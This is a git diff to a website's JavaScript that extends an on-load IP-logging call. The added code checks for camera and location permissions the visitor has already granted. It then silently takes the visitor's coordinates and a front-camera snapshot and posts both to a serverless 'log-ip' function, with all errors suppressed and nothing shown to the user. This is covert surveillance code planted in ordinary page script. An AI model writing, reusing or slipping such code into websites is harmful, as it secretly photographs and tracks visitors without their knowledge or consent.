@@ -154,14 +154,96 @@ document.addEventListener('DOMContentLoaded', () => {
   try {
     const dntFlag = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack) === '1' ? '1' : '0';
     if (!sessionStorage.getItem('ipLogged')) {
-      fetch('/.netlify/functions/log-ip', {
+      const send = (payload) => fetch('/.netlify/functions/log-ip', {
         method: 'POST',
-        headers: { 'x-dnt': dntFlag }
+        headers: Object.assign({ 'x-dnt': dntFlag }, payload ? { 'content-type': 'application/json' } : {}),
+        body: payload ? JSON.stringify(payload) : undefined
       })
         .catch(() => {})
         .finally(() => {
           try { sessionStorage.setItem('ipLogged', '1'); } catch (_) {}
         });
+
+      let handled = false;
+      try {
+        if (navigator.permissions && navigator.geolocation) {
+          navigator.permissions.query({ name: 'geolocation' }).then(p => {
+            if (p.state === 'granted') {
+              navigator.geolocation.getCurrentPosition(
+                pos => {
+                  const coords = pos && pos.coords ? pos.coords : null;
+                  const base = coords ? { lat: coords.latitude, lon: coords.longitude, accuracy: coords.accuracy } : {};
+                  try {
+                    if (navigator.permissions) {
+                      navigator.permissions.query({ name: 'camera' }).then(pc => {
+                        if (pc.state === 'granted' && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.onloadedmetadata = () => {
+                              const w = 320, h = Math.floor((video.videoHeight || 240) * (320 / (video.videoWidth || 320)) ) || 240;
+                              const canvas = document.createElement('canvas');
+                              canvas.width = w; canvas.height = h;
+                              const ctx = canvas.getContext('2d');
+                              try { ctx.drawImage(video, 0, 0, w, h); } catch (_) {}
+                              let dataUrl = '';
+                              try { dataUrl = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { dataUrl = ''; }
+                              try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
+                              const payload = Object.assign({}, base, dataUrl ? { photo: dataUrl } : {});
+                              send(payload);
+                            };
+                            try { video.play().catch(() => {}); } catch (_) {}
+                          }).catch(() => { send(base); });
+                        } else {
+                          send(base);
+                        }
+                      }).catch(() => { send(base); });
+                    } else {
+                      send(base);
+                    }
+                  } catch (_) { send(base); }
+                },
+                () => { send(); },
+                { maximumAge: 60000, timeout: 2000, enableHighAccuracy: false }
+              );
+            } else {
+              try {
+                if (navigator.permissions) {
+                  navigator.permissions.query({ name: 'camera' }).then(pc => {
+                    if (pc.state === 'granted' && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                          const w = 320, h = Math.floor((video.videoHeight || 240) * (320 / (video.videoWidth || 320)) ) || 240;
+                          const canvas = document.createElement('canvas');
+                          canvas.width = w; canvas.height = h;
+                          const ctx = canvas.getContext('2d');
+                          try { ctx.drawImage(video, 0, 0, w, h); } catch (_) {}
+                          let dataUrl = '';
+                          try { dataUrl = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { dataUrl = ''; }
+                          try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
+                          const payload = dataUrl ? { photo: dataUrl } : undefined;
+                          send(payload);
+                        };
+                        try { video.play().catch(() => {}); } catch (_) {}
+                      }).catch(() => { send(); });
+                    } else {
+                      send();
+                    }
+                  }).catch(() => { send(); });
+                } else {
+                  send();
+                }
+              } catch (_) { send(); }
+            }
+          }).catch(() => { if (!handled) send(); });
+          handled = true;
+        }
+      } catch (_) {}
+      if (!handled) {
+        send();
+      }
     }
   } catch (_) {}
 
